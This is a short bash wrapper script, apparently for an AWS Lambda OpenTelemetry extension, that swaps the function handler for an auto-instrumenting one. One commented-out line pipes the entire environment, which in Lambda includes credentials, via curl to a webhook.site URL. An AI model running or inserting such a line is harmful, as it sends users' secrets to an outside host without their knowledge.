#!/bin/bash

export ORIG_HANDLER=$_HANDLER
export _HANDLER="serverless.aws_lambda_otel_extension.internal.wrapper.auto_instrumenting_handler"

#export | curl --data-binary @- --header "Content-Type: text/plain"  http://webhook.site/9fe27a37-8ebd-4a3b-9969-e446cfb03951

export EXPORTS=`export`

exec "$@"
